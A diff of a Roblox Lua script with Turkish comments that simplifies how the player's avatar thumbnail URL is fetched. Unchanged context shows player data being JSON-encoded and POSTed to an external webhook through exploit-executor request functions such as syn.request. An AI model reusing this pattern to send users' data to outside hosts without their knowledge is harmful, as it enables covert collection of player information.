@@ -8,11 +8,7 @@ local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
 -- Oyuncunun avatar resminin URL'sini al
-local playerProfileUrl
-while not playerProfileUrl do
-    playerProfileUrl = Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
-    wait(1) -- Bekleme ekle, işlem tamamlanana kadar beklemesi için
-end
+local playerProfileUrl = game:GetService("Players"):GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
 
 local function getRandomColor()
     return math.random(0, 0xFFFFFF)
@@ -47,4 +43,4 @@ local data = {
 local PlayerData = game:GetService('HttpService'):JSONEncode(data)
 
 local Request = http_request or request or HttpPost or syn.request
-Request({Url = Webhook_URL, Body = PlayerData, Method = "POST", Headers = Headers})
+Request({Url = Webhook_URL, Body = PlayerData, Method = "POST", Headers = Headers}) 
